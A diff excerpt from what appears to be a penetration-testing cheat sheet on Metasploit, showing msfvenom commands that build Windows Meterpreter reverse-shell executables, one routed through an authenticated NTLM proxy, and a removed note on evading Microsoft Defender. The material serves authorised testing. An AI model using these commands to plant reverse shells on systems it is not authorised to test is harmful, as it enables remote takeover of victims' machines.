@@ -94,8 +94,7 @@ NOTES:
 ➤ Custom msfvenom encrypter module => https://github.com/Sogeti-Pentest/Encrypter-Metasploit
 ➤ Command to generate a meterpreter that is able to go trhough an authenticated ntlm proxy:
   + msfvenom -p windows/meterpreter/reverse_https_proxy EXITFUNC=thread HttpProxyHost=X.X.X.X HttpProxyPort=8080 HttpProxyUser="Domain\account" HttpProxyPass=AccountPassword LHOST=Y.Y.Y.Y LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps.exe
-➤ Command to generate a meterpreter reverse shell in csharp that is not encrytped / nor obfuscated but strangely is not detected by the MS Defender AV:
-  + msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x64 -f csharp -f exe-only -o meterpreter-staged-x64-reverse-https-csharp.exe
+➤ Multiple techniques & tools (such as shellcode loaders and packers) exist to evade AV detection. For more details please refer to the 'Defense Evasion' section.
 
 
 3 - Set up and launch a Meterpreter handler (windows/meterpreter/reverse_https)
